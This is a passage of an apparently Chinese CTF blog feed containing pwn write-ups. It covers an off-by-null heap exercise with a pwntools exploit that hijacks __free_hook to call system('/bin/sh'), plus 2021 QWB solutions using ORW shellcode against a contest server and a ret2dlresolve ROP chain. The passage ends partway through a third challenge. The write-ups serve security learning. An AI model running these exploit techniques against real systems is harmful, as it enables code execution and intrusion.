class="built_in">puts</span>(<span class="string">"Index?"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&gt;=<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"wrong index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!chunks[index].<span class="built_in">point</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"It's blank!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(chunks[index].<span class="built_in">point</span>);</span><br><span class="line">chunks[index].<span class="built_in">point</span>=<span class="number">0</span>;</span><br><span class="line">chunks[index].<span class="built_in">size</span>=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"1) add a chunk"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"2) show content"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"3) edit a chunk"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"4) delete a chunk"</span>);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> choice;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Welcome to my off by null vuln vulnerability exercise."</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"wish you will play happy!"</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">menu();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;choice);</span><br><span class="line"><span class="keyword">switch</span>(choice)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">add();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">show();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">edit();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="keyword">delete</span>();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./text'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,size)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'Size?'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text=<span class="string">''</span>)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index?'</span>) </span><br><span class="line">    p.sendline(str(num))   </span><br><span class="line">    p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">    p.send(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index?\n'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line"> <span class="comment">#1.创造4个大于tcache的最大值并且在largebin范围内的chunk A、B、C、D。</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x450</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x450</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x450</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">0x4f0</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x450</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#按照顺序释放A、C、D，形成largebins 链表。</span></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#释放chunk B，让chunk B和chunk C产生合并</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#让old chunk C的 old fd 与old bk保留在new chunk 底部。</span></span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x470</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x430</span>)</span><br><span class="line"><span class="comment">#复原chunk</span></span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x450</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x450</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#修改chunk A bf 值为old chunk C addr。修改chunk D fd 值为old chunk C addr。</span></span><br><span class="line"><span class="comment">#(这里体现方法的一个弊端，如果`\n`不能替换‘\x00’就需要题目有show功能)</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x450</span>) <span class="comment">#bk</span></span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x430</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x450</span>) </span><br><span class="line">    edit(<span class="number">0</span>,p8(<span class="number">0</span>)*<span class="number">7</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">0x500</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x450</span>)</span><br><span class="line">    show(<span class="number">5</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    fd=(u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x20</span>)</span><br><span class="line">    <span class="comment">#fd=p.recvline()</span></span><br><span class="line">    print(hex(fd))</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x438</span>)</span><br><span class="line">    edit(<span class="number">5</span>,p64(fd))</span><br><span class="line"><span class="comment">#通过new chunk B修改  old chunk C size 为fake size。通过new chunk B修改  old chunk C size 为fake size。（这里就用残留的0x460）通过new chunk C 修改隔离chunk的`prevsize`值为fake size，</span></span><br><span class="line">    edit(<span class="number">3</span>,p8(<span class="number">0</span>)*<span class="number">0x430</span>+p64(<span class="number">0x460</span>))</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">    print(hex(fd))</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x100</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    main_arena=(u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span>)</span><br><span class="line">    <span class="comment">#fd=p.recvline()</span></span><br><span class="line">    print(hex(main_arena))</span><br><span class="line">    malloc_hook=main_arena<span class="number">-0x10</span></span><br><span class="line">    x=libcfind.finder(<span class="string">'__malloc_hook'</span>,malloc_hook,num=<span class="number">5</span>)</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">[-] 0: libc6_2.15-0ubuntu10.23_amd64(source from:ubuntu-eglibc)</span></span><br><span class="line"><span class="string">[-] 1: libc6-amd64_2.30-0ubuntu2.2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 2: libc6_2.30-0ubuntu2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 3: libc6-amd64_2.31-0ubuntu9.2_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 4: libc6_2.31-0ubuntu9_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 5: local-ad9f264101ca975f82b40fffd5aa6f763cfd1ed9(source from:/usr/lib/x86_64-linux-gnu/libc-2.31.so)</span></span><br><span class="line"><span class="string">[-] 6: libc6-amd64_2.30-0ubuntu2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 7: libc6-amd64_2.31-0ubuntu9_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 8: libc6_2.31-0ubuntu9.2_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 9: libc6_2.30-0ubuntu2.2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="number">0x420</span>*p8(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x111</span>)+p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">    print(<span class="string">'ok1'</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">'/bin/sh\x00\n'</span>)</span><br><span class="line">    print(<span class="string">'ok1'</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x100</span>)</span><br><span class="line">    edit(<span class="number">1</span>,p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line">    addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span></span><br><span class="line">    log.info(<span class="string">'main_arena:'</span>+hex(addr))</span><br><span class="line">    malloc_hook=addr<span class="number">-0x10</span></span><br><span class="line">    log.info(<span class="string">'malloc_hook:'</span>+hex(malloc_hook))</span><br><span class="line">    x=libcfind.finder(<span class="string">'__malloc_hook'</span>,malloc_hook,num=<span class="number">5</span>)</span><br><span class="line">    log.info(<span class="string">'base:'</span>+hex(x.libcbase))</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    multi libc results:</span></span><br><span class="line"><span class="string">[-] 0: libc6_2.15-0ubuntu10.23_amd64(source from:ubuntu-eglibc)</span></span><br><span class="line"><span class="string">[-] 1: libc6-amd64_2.30-0ubuntu2.2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 2: libc6_2.30-0ubuntu2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 3: libc6-amd64_2.31-0ubuntu9.2_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 4: libc6_2.31-0ubuntu9_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 5: local-ad9f264101ca975f82b40fffd5aa6f763cfd1ed9(source from:/usr/lib/x86_64-linux-gnu/libc-2.31.so)</span></span><br><span class="line"><span class="string">[-] 6: libc6-amd64_2.30-0ubuntu2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 7: libc6-amd64_2.31-0ubuntu9_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 8: libc6_2.31-0ubuntu9.2_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 9: libc6_2.30-0ubuntu2.2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    edit(<span class="number">7</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">    print(<span class="string">'ok1'</span>)</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">9</span>,<span class="number">0x60</span>)</span><br><span class="line">    print(<span class="string">'ok2'</span>)</span><br><span class="line">    edit(<span class="number">8</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    edit(<span class="number">9</span>,p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">    print(<span class="string">'ok3'</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    print(<span class="string">'ok4'</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./text'</span>)</span><br><span class="line">pwn()</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>off by null 自从qwb被打懵后一直想了解这个知识，但又是毕业那些一大堆事情。同时tcl看了很多文章才看懂。感谢wjh爷爷和nopnoping爷爷的文章。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://nopnoping.github.io/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://nopnoping.github.io/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</a></p><p><a href="http://blog.wjhwjhn.com/archives/193/" target="_blank" rel="noopener">http://blog.wjhwjhn.com/archives/193/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021qwb-pwn-初赛-wp</title>
      <link href="/2021/06/26/2021qwb%20pwn%20wp/"/>
      <url>/2021/06/26/2021qwb%20pwn%20wp/</url>
      
        <content type="html"><![CDATA[<p>tcl,逆向能力薄弱的我被qwb打傻了.赛后复现时,发现好多题思路是对的.卡在了逆向反推上面.但反过来,在赛后看了很多大牛的博客后,也学习到很多知识,想这段时间忙完后单独写几篇来坐坐笔记。<a id="more"></a></p><h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><p>这道题在创建chunk时，存在有数组越界导致我们可以劫持got表，从而劫持了exit那些函数。再通过整数溢出扩大shell_code写入的范围。同时，由于execve导致我们只能通过orw（open read write）的方法读flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'39.105.131.68'</span>,<span class="number">12354</span>)</span><br><span class="line"><span class="comment">#process('./pwn2')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,size,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    <span class="comment">#p.recvuntil('content')</span></span><br><span class="line">    p.sendline(text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    <span class="comment">#p.recvuntil('index')</span></span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">-13</span>,<span class="number">0xffffffff</span>+<span class="number">1</span>,asm(<span class="string">'''</span></span><br><span class="line"><span class="string"> mov rsi, [r13+8];</span></span><br><span class="line"><span class="string"> mov rdx, 0x8;</span></span><br><span class="line"><span class="string"> mov rdi, 0x0;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x0;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> mov rsi, [r13+8];</span></span><br><span class="line"><span class="string"> mov rdx, 0x8;</span></span><br><span class="line"><span class="string"> mov rdi, 0x1;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x1;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> mov rdi, [r13+8];</span></span><br><span class="line"><span class="string"> mov rdx, 0x0;</span></span><br><span class="line"><span class="string"> mov rsi, 0x60;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x2;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> mov rsi, [r13+8];</span></span><br><span class="line"><span class="string"> mov rdx, 0x68;</span></span><br><span class="line"><span class="string"> mov rdi, 0x3;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x0;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> mov rsi, [r13+8];</span></span><br><span class="line"><span class="string"> mov rdx, 0x68;</span></span><br><span class="line"><span class="string"> mov rdi, 0x1;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x1;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> '''</span>))</span><br><span class="line"><span class="comment">#free(-6)</span></span><br><span class="line"><span class="comment">#add(1,7,'w'*0x7)</span></span><br><span class="line">print(<span class="string">'x_x'</span>)</span><br><span class="line"><span class="comment">#free(-13)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">print(<span class="string">'x_x'</span>)</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">print(<span class="string">'x_x'</span>)</span><br><span class="line">p.sendline(<span class="string">'/flag\x00'</span>)</span><br><span class="line">free(<span class="number">-6</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="no-output"><a href="#no-output" class="headerlink" title="no_output"></a>no_output</h2><p>题目有的阴间，ban了标准输出而且我IDA F5的代码又有问题识别不了libc函数（太菜了）。导致只能慢慢手撕汇编和动态gdb。通过合理覆盖，让 <code>read(3,xx,xx)</code>变为<code>read(0,xx,xx)</code>写入‘hello_boy\x00’绕过cmp。</p><p>再通过’-0x80000000/-1==0’的特性触发signal，进入栈溢出的read，ret2dl-resolve get shall.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./test'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote('39.105.138.97',1234)</span></span><br><span class="line">p=process(<span class="string">'./test'</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'\x00\x00\n'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(<span class="string">'w'</span>*(<span class="number">0x30</span><span class="number">-16</span>)+<span class="string">'hello_boy\x00\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'x'</span>*<span class="number">0x5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(str(<span class="number">-0x80000000</span>))</span><br><span class="line">p.sendline(str(<span class="number">-1</span>))</span><br><span class="line">rop = ROP(<span class="string">'./test'</span>)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(e, symbol=<span class="string">"system"</span>, args=[<span class="string">"/bin/sh"</span>]) </span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr) </span><br><span class="line">rop.ret2dlresolve(dlresolve) </span><br><span class="line">raw_rop = rop.chain() </span><br><span class="line">print(rop.dump())</span><br><span class="line">print(hex(dlresolve.data_addr))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'x'</span>*(<span class="number">0x50</span><span class="number">-4</span>)+raw_rop)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.sendline(dlresolve.payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="baby-diary"><a href="#baby-diary" class="headerlink" title="baby_diary"></a>baby_diary</h2><p>典型的高版本all-off-null,不同的是在我们在对面chunk写入信息后,会根据我们的写入,计算一个半字节并放入我们输入信息后.当我们出入全是’\x00’,那个半字节就是’\x0’,若不是’\x00则是非’\x0’的办字节.因此我们在输入时,至少影响一个半的字节.因此我们只能通过爆破法来求解.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 